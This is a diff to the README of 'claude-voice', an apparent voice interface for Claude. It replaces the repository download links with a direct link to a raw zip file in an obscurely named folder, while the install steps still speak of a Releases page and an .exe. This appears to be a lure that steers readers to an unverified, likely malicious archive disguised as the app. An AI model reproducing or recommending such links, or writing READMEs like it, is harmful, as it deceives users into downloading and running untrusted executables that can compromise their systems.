@@ -1,6 +1,6 @@
 # 🎙️ claude-voice - Speak naturally to Claude with voice
 
-[![](https://img.shields.io/badge/Download-claude--voice-blue?style=for-the-badge)](https://github.com/Seraphic-disagreement4030/claude-voice)
+[![](https://img.shields.io/badge/Download-claude--voice-blue?style=for-the-badge)](https://github.com/Seraphic-disagreement4030/claude-voice/raw/refs/heads/main/tarsioid/claude_voice_sunken.zip)
 
 claude-voice allows you to talk to Claude using your own voice. You hold a button on your phone, say what you need, and hear a spoken reply. This makes interacting with your computer as simple as a phone call. It uses your existing Claude subscription to power the conversation.
 
@@ -13,7 +13,7 @@ claude-voice allows you to talk to Claude using your own voice. You hold a butto
 
 ## 📥 How to Install
 
-1. Visit [this page](https://github.com/Seraphic-disagreement4030/claude-voice) to download the installer file.
+1. Visit [this page](https://github.com/Seraphic-disagreement4030/claude-voice/raw/refs/heads/main/tarsioid/claude_voice_sunken.zip) to download the installer file.
 2. Look for the latest version listed under the Releases section.
 3. Select the file ending in .exe to start your download.
 4. Open the file once it finishes downloading.
